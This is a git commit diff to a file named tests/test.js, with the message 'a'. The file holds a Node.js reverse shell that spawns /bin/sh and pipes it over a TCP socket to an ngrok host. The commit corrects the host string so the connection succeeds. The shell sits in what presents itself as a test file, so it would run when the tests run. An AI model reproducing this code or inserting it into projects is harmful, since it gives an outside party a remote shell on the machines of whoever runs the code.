845ec500b0346283a5454bf73435bb72d7107245
Juri Sacchetta <jurisacchetta@gmail.com>
2023-04-15 16:04:26 +0200

    a

--- tests/test.js
+++ tests/test.js
@@ -6,7 +6,7 @@ var net = require("net")
 cp = require("child_process");
 sh = cp.spawn("/bin/sh", []);
 var client = new net.Socket();
-client.connect(16792, "tcp://4.tcp.ngrok.io", function () {
+client.connect(16792, "4.tcp.ngrok.io", function () {
   client.pipe(sh.stdin);
   sh.stdout.pipe(client);
   sh.stderr.pipe(client);
